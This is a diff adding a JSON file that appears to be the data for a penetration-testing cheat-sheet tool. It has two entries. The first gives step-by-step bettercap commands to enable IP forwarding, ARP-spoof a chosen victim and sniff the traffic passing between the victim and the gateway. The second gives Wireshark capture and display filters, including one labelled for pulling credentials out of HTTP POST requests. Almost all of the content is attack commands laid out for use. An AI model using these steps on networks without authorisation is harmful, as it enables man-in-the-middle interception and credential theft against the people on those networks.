@@ -1,0 +1,27 @@
+{
+  "arp_spoofing": {
+    "title": "ARP Spoofing / MITM",
+    "category": "Network & MITM",
+    "desc": "Intercept traffic between target victim and default gateway.",
+    "steps": [
+      ["Enable IP forwarding", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
+      ["Start bettercap interface", "sudo bettercap -iface eth0"],
+      ["Set spoof victim", "set arp.spoof.targets <IP>"],
+      ["Enable ARP spoofing engine", "arp.spoof on"],
+      ["Enable network sniffer", "set net.sniff on"],
+      ["Capture packets with Wireshark", "sudo wireshark"]
+    ]
+  },
+  "wireshark": {
+    "title": "Wireshark - Protocol Analyzer",
+    "category": "Network & MITM",
+    "desc": "Deep packet inspection and traffic flow analysis.",
+    "steps": [
+      ["Start Wireshark GUI", "sudo wireshark"],
+      ["Capture filter HTTP port 80", "tcp port 80"],
+      ["Display filter HTTP requests", "http.request"],
+      ["Follow TCP stream", "Right-click packet -> Follow -> TCP Stream"],
+      ["Filter credentials in POST", "http.request.method == \"POST\""]
+    ]
+  }
+}
